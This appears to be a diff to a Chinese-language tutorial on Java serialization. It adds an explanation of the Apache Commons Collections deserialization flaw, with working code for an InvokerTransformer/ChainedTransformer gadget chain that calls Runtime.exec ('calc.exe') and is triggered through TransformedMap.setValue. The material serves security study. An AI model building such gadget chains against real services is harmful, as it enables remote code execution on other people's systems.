@@ -845,80 +845,178 @@ Java 序列化常被用于Socket传输。 在RMI(Java远程方法调用-Java Rem
 
 Java类实现`java.io.Serializable`(内部序列化)或`java.io.Externalizable`(外部序列化)接口即可被序列化。
 
-??? note "code"
+=== "java.io.Serializable"
 
-    ```java
-    package cc.serial;
+    `java.io.Serializable`是一个空接口，仅用于标记类可以被序列化。序列化机制会根据类的属性生成一个`serialVersionUID`，用于判断序列化对象是否一致。反序列化时如果`serialVersionUID`不一致会导致`InvalidClassException` 异常。如果未显式声明，则序列化运行时通过内置方法将计算默认 `serialVersionUID`值。
 
-    import java.io.*;
-    import java.util.Arrays;
-
-    public class DeserializationTest implements Serializable {
-
-        private String username;
-
-        private String email;
-
-        public DeserializationTest() {
-            System.out.println("init...");
+    ```java title="java.io.Serializable"
+        public interface Serializable {
         }
+    ```
+    
+    ??? note "code"
 
-        public String getUsername() {
-            return username;
-        }
+        ```java
+        package cc.serial;
 
-        public void setUsername(String username) {
-            this.username = username;
-        }
+        import java.io.*;
+        import java.util.Arrays;
 
-        public String getEmail() {
-            return email;
-        }
+        public class DeserializationTest implements Serializable {
 
-        public void setEmail(String email) {
-            this.email = email;
-        }
+            private String username;
 
-        public static void main(String[] args) {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            private String email;
 
-            try {
-                // 创建DeserializationTest类，并类设置属性值
-                DeserializationTest t = new DeserializationTest();
-                t.setUsername("colemak");
-                t.setEmail("admin@javaweb.org");
-
-                // 创建Java对象序列化输出流对象
-                ObjectOutputStream out = new ObjectOutputStream(baos);
-
-                // 序列化DeserializationTest类
-                out.writeObject(t);
-                out.flush();
-                out.close();
-
-                // 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址
-                System.out.println("DeserializationTest类序列化后的字节数组:" + Arrays.toString(baos.toByteArray()));
-
-                // 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作
-                ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-
-                // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
-                ObjectInputStream in = new ObjectInputStream(bais);
-
-                // 反序列化输入流数据为DeserializationTest对象
-                DeserializationTest test = (DeserializationTest) in.readObject();
-                System.out.println("用户名:" + test.getUsername() + ",邮箱:" + test.getEmail());
-
-                // 关闭ObjectInputStream输入流
-                in.close();
-            } catch (IOException | ClassNotFoundException e) {
-                e.printStackTrace();
+            public DeserializationTest() {
+                System.out.println("init...");
             }
-        }
 
-    }
+            public String getUsername() {
+                return username;
+            }
+
+            public void setUsername(String username) {
+                this.username = username;
+            }
+
+            public String getEmail() {
+                return email;
+            }
+
+            public void setEmail(String email) {
+                this.email = email;
+            }
+
+            public static void main(String[] args) {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+
+                try {
+                    // 创建DeserializationTest类，并类设置属性值
+                    DeserializationTest t = new DeserializationTest();
+                    t.setUsername("colemak");
+                    t.setEmail("admin@javaweb.org");
+
+                    // 创建Java对象序列化输出流对象
+                    ObjectOutputStream out = new ObjectOutputStream(baos);
+
+                    // 序列化DeserializationTest类
+                    out.writeObject(t);
+                    out.flush();
+                    out.close();
+
+                    // 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址
+                    System.out.println("DeserializationTest类序列化后的字节数组:" + Arrays.toString(baos.toByteArray()));
+
+                    // 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作
+                    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+
+                    // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
+                    ObjectInputStream in = new ObjectInputStream(bais);
+
+                    // 反序列化输入流数据为DeserializationTest对象
+                    DeserializationTest test = (DeserializationTest) in.readObject();
+                    System.out.println("用户名:" + test.getUsername() + ",邮箱:" + test.getEmail());
+
+                    // 关闭ObjectInputStream输入流
+                    in.close();
+                } catch (IOException | ClassNotFoundException e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+        ```
+        程序执行结果如下：
+        ![alt text](img/12.png){width=70%}
+
+    `ObjectOutputStream`序列化类对象的主要流程是首先判断序列化的类是否重写了`writeObject`方法，如果重写了就调用对象自身的`writeObject`方法，序列化时会先写入类名信息，其次是写入成员变量信息(通过反射获取所有不包含被`transient`修饰的变量和值)。
+
+
+=== "java.io.Externalizable"
+
+    `java.io.Externalizable`接口定义了`writeExternal`和`readExternal`方法需要序列化和反序列化的类实现，其余的和`java.io.Serializable`并无差别。
+
+    ```java title="java.io.Externalizable"
+        public interface Externalizable extends java.io.Serializable {
+
+        void writeExternal(ObjectOutput out) throws IOException;
+
+        void readExternal(ObjectInput in) throws IOException, ClassNotFoundException;
+
+        }
     ```
 
+    ??? note "code"
+
+        ```java
+        package cc.serial;
+
+        import java.io.*;
+        import java.util.Arrays;
+
+        public class ExternalizableTest implements java.io.Externalizable {
+
+            private String username;
+            private String email;
+
+            public String getUsername() { return username; }
+            public void setUsername(String username) { this.username = username; }
+            public String getEmail() { return email; }
+            public void setEmail(String email) { this.email = email; }
+
+            @Override
+            public void writeExternal(ObjectOutput out) throws IOException {
+                out.writeObject(username);
+                out.writeObject(email);
+            }
+
+            @Override
+            public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
+                this.username = (String) in.readObject();
+                this.email = (String) in.readObject();
+            }
+
+            public static void main(String[] args) {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+
+                try {
+                    // 创建ExternalizableTest类，并类设置属性值
+                    ExternalizableTest t = new ExternalizableTest();
+                    t.setUsername("yz");
+                    t.setEmail("admin@javaweb.org");
+
+                    ObjectOutputStream out = new ObjectOutputStream(baos);
+                    out.writeObject(t);
+                    out.flush();
+                    out.close();
+
+                    // 打印ExternalizableTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址
+                    System.out.println("ExternalizableTest类序列化后的字节数组:" + Arrays.toString(baos.toByteArray()));
+                    System.out.println("ExternalizableTest类反序列化后的字符串:" + new String(baos.toByteArray()));
+
+                    // 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作
+                    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+
+                    // 通过反序列化输入流创建Java对象输入流(ObjectInputStream)对象
+                    ObjectInputStream in = new ObjectInputStream(bais);
+
+                    // 反序列化输入流数据为ExternalizableTest对象
+                    ExternalizableTest test = (ExternalizableTest) in.readObject();
+                    System.out.println("用户名:" + test.getUsername() + ",邮箱:" + test.getEmail());
+
+                    // 关闭ObjectInputStream输入流
+                    in.close();
+                } catch (IOException | ClassNotFoundException e) {
+                    e.printStackTrace();
+                }
+            }
+
+        }
+        ```
+        程序执行结果如下：
+        ![alt text](img/13.png){width=70%}
+    
 反序列化类对象时有如下限制：
 
 - 被反序列化的类必须存在。
@@ -956,5 +1054,308 @@ Java类实现`java.io.Serializable`(内部序列化)或`java.io.Externalizable`(
         }
     }
     ```
-    程序运行结果如下：
-        
+
+    程序运行结果如下，观察到未调用构造函数输出"init"：
+
+    ![alt text](img/11.png){width=70%}
+
+参考[不用构造方法也能创建对象](https://www.iteye.com/topic/850027){target="_blank"}
+
+### 自定义序列化(writeObject)和反序列化(readObject)方法
+
+实现了`java.io.Serializable`接口的类，可以定义如下方法(反序列化魔术方法)，这些方法将会在类序列化或反序列化过程中调用：
+
+1. **private void writeObject(ObjectOutputStream oos),自定义序列化**。
+2. **private void readObject(ObjectInputStream ois)，自定义反序列化**。
+3. private void readObjectNoData()。
+4. protected Object writeReplace()，写入时替换对象。
+5. protected Object readResolve()。
+
+具体的方法名定义在`java.io.ObjectStreamClass#ObjectStreamClass(java.lang.Class<?>)`，其中方法有详细的声明。
+
+### Apache Commons Collections反序列化漏洞
+
+Apache Commons是Apache开源的Java通用类项目，在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的Collection（集合）相关类对象。本节将逐步详解Collections反序列化攻击链(仅以TransformedMap调用链为示例)最终实现反序列化RCE。(1)
+{ .annote }
+
+1. [Commons-Collections反序列化漏洞](https://www.cnblogs.com/BUTLER/p/16478574.html){target="_blank"}
+
+#### Transformer
+
+`Transformer`是`org.apache.commons.collections.Transformer`接口的实现类，`Transformer`接口定义了一个`transform`方法，用于对输入的对象进行转换。
+```java title="org.apache.commons.collections.Transformer"
+    /**
+     * 将输入对象（保持不变）转换为某个输出对象。
+     *
+     * @param input  需要转换的对象，应保持不变
+     * @return 一个已转换的对象
+     * @throws ClassCastException (runtime) 如果输入是错误的类
+     * @throws IllegalArgumentException (runtime) 如果输入无效
+     * @throws FunctorException (runtime) 如果转换无法完成
+     */
+    public interface Transformer {
+        Object transform(Object input);
+    }
+```
+
+该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap`
+
+#### ConstantTransformer
+
+ConstantTransformer，常量转换：传入对象不会经过任何改变直接返回。
+
+```java title="org.apache.commons.collections.functors.ConstantTransformer"
+package org.apache.commons.collections.functors;
+
+import java.io.Serializable;
+import org.apache.commons.collections.Transformer;
+
+public class ConstantTransformer implements Transformer, Serializable {
+
+    private static final long serialVersionUID = 6374440726369055124L;
+
+    /** 每次都返回null */
+    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);
+
+    /** The closures to call in turn */
+    private final Object iConstant;
+
+    public static Transformer getInstance(Object constantToReturn) {
+        if (constantToReturn == null) {
+            return NULL_INSTANCE;
+        }
+
+        return new ConstantTransformer(constantToReturn);
+    }
+
+    public ConstantTransformer(Object constantToReturn) {
+        super();
+        iConstant = constantToReturn;
+    }
+
+    public Object transform(Object input) {
+        return iConstant;
+    }
+
+    public Object getConstant() {
+        return iConstant;
+    }
+}
+```
+
+#### InvokerTransformer
+
+`org.apache.commons.collections.functors.InvokerTransformer`实现了`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化RCE，并提供了利用方法：[ysoserial CC1](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java){target="_blank"}
+
+`InvokerTransformer`类的`transform`方法通过反射调用指定对象的方法，返回方法执行结果。
+
+```java title="org.apache.commons.collections.functors.InvokerTransformer"
+public class InvokerTransformer implements Transformer, Serializable {
+
+    private static final long serialVersionUID = -8653385846894047688L;
+
+    /** 要调用的方法名称 */
+    private final String iMethodName;
+
+    /** 反射参数类型数组 */
+    private final Class[] iParamTypes;
+
+    /** 反射参数值数组 */
+    private final Object[] iArgs;
+
+    ···
+
+    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+
+    public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        }
+        try {
+              // 获取输入类的类对象
+            Class cls = input.getClass();
+
+              // 通过输入的方法名和方法参数，获取指定的反射方法对象
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+
+              // 反射调用指定的方法并返回方法调用结果
+            return method.invoke(input, iArgs);
+        } catch (Exception ex) {
+            // 省去异常处理部分代码
+        }
+    }
+}
+```
+
+#### ChainedTransformer
+
+`org.apache.commons.collections.functors.ChainedTransformer` 类封装了`Transformer`的链式调用，对于传入的`Transformer`数组，`ChainedTransformer`依次调用每一个`Transformer`的`transform`方法。
+
+```java title="org.apache.commons.collections.functors.ChainedTransformer"
+public class ChainedTransformer implements Transformer, Serializable {
+
+  /** The transformers to call in turn */
+  private final Transformer[] iTransformers;
+
+  ...
+
+  public ChainedTransformer(Transformer[] transformers) {
+      super();
+      iTransformers = transformers;
+  }
+  public Object transform(Object object) {
+      for (int i = 0; i < iTransformers.length; i++) {
+          object = iTransformers[i].transform(object);
+      }
+      return object;
+  }
+}
+```
+
+??? example "使用ChainedTransformer实现调用本地命令执行方法"
+
+    ```java
+    import org.apache.commons.collections.Transformer;
+    import org.apache.commons.collections.functors.ChainedTransformer;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.InvokerTransformer;
+
+    public class ChainTransformer {
+
+        public static void main(String[] args) throws Exception {
+            // 定义需要执行的本地系统命令
+            String cmd = "calc.exe";
+
+            // ChainedTransformer调用链分解
+
+    //        // new ConstantTransformer(Runtime.class
+    //        Class<?> runtimeClass = Runtime.class;
+    //
+    //        // new InvokerTransformer("getMethod", new Class[]{
+    //        //         String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
+    //        // ),
+    //        Class  cls1       = runtimeClass.getClass();
+    //        Method getMethod  = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
+    //        Method getRuntime = (Method) getMethod.invoke(runtimeClass, new Object[]{"getRuntime", new Class[0]});
+    //
+    //        // new InvokerTransformer("invoke", new Class[]{
+    //        //         Object.class, Object[].class}, new Object[]{null, new Object[0]}
+    //        // )
+    //        Class   cls2         = getRuntime.getClass();
+    //        Method  invokeMethod = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
+    //        Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]});
+    //
+    //        // new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
+    //        Class  cls3       = runtime.getClass();
+    //        Method execMethod = cls3.getMethod("exec", new Class[]{String.class});
+    //        execMethod.invoke(runtime, cmd);
+
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer("getMethod", new Class[]{
+                            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
+                    ),
+                    new InvokerTransformer("invoke", new Class[]{
+                            Object.class, Object[].class}, new Object[]{null, new Object[0]}
+                    ),
+                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
+            };
+
+            // 创建ChainedTransformer调用链对象
+            Transformer transformedChain = new ChainedTransformer(transformers);
+
+            // 执行对象转换操作
+            Object transform = transformedChain.transform(null);
+
+            System.out.println(transform);
+        }
+
+    }
+    ```
+    运行结果如下：
+    ![alt text](img/14.png)
+
+#### 利用InvokerTransformer执行本地命令
+
+现在我们已经使用`InvokerTransformer`创建了一个含有恶意调用链的Transformer类的Map对象，紧接着我们应该思考如何才能够将调用链串起来并执行。
+
+`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对Map的key或者value进行Transformer转换，调用`decorate`和`decorateTransform`方法就可以创建一个`TransformedMap`:
+
+```java title="org.apache.commons.collections.map.TransformedMap"
+public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+      return new TransformedMap(map, keyTransformer, valueTransformer);
+}
+
+public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+      ...
+}
+```
+
+调用`TransformedMap`的`setValue`/`put`/`putAll`中的任意方法都会调用`transform`方法，从而也就会触发命令执行：
+
+??? example "使用 TransformedMap类的setValue触发transform示例："
+
+    ```java
+    import org.apache.commons.collections.Transformer;
+    import org.apache.commons.collections.functors.ChainedTransformer;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.InvokerTransformer;
+    import org.apache.commons.collections.map.TransformedMap;
+
+    import java.util.HashMap;
+    import java.util.Map;
+
+    public class TransformedMapTest {
+
+        public static void main(String[] args) {
+            String cmd = "calc.exe";
+
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer("getMethod", new Class[]{
+                            String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
+                    ),
+                    new InvokerTransformer("invoke", new Class[]{
+                            Object.class, Object[].class}, new Object[]{null, new Object[0]}
+                    ),
+                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
+            };
+
+            // 创建ChainedTransformer调用链对象
+            Transformer transformedChain = new ChainedTransformer(transformers);
+
+            // 创建Map对象
+            Map map = new HashMap();
+            map.put("value", "value");
+
+            // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
+            Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
+
+            // transformedMap.put("v1", "v2");// 执行put也会触发transform
+
+            // 遍历Map元素，并调用setValue方法
+            for (Object obj : transformedMap.entrySet()) {
+                Map.Entry entry = (Map.Entry) obj;
+
+                // setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
+                entry.setValue("test");
+            }
+
+            System.out.println(transformedMap);
+        }
+
+    }
+    ```
+    运行结果如下：
+    ![alt text](img/15.png)
+
+任何一个类只要符合以下条件，我们就可以在Java反序列化的时候触发`InvokerTransformer`类的`transform`方法实现RCE：
+
+1. 实现了`java.io.Serializable`接口
+2. 并且可以传入我们构建的`TransformedMap`对象
+3. 调用了`TransformedMap`中的`setValue`/`put`/`putAll`中的任意方法一个方法的类
